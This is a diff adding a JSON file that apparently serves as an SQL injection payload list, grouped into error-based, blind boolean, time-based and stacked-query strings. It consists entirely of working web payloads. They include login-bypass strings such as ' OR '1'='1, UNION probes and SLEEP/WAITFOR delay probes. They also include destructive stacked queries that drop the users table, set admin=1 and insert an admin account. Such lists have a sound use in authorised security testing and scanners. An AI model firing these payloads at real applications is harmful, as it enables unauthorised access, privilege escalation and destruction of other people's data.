@@ -1,0 +1,28 @@
+{
+  "error_based": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 'a'='a",
+    "' UNION SELECT NULL--",
+    "1' UNION SELECT NULL,NULL--",
+    "' AND 1=1--",
+    "' AND 1=2--"
+  ],
+  "blind_boolean": [
+    "' AND '1'='1",
+    "' AND '1'='2",
+    "' AND 1=1#",
+    "' AND 1=2#"
+  ],
+  "time_based": [
+    "' AND SLEEP(5)--",
+    "' AND BENCHMARK(50000000,MD5('A'))--",
+    "' OR SLEEP(5)--",
+    "'; WAITFOR DELAY '00:00:05'--"
+  ],
+  "stacked_queries": [
+    "'; DROP TABLE users--",
+    "'; UPDATE users SET admin=1--",
+    "'; INSERT INTO users VALUES('admin','pass')--"
+  ]
+}
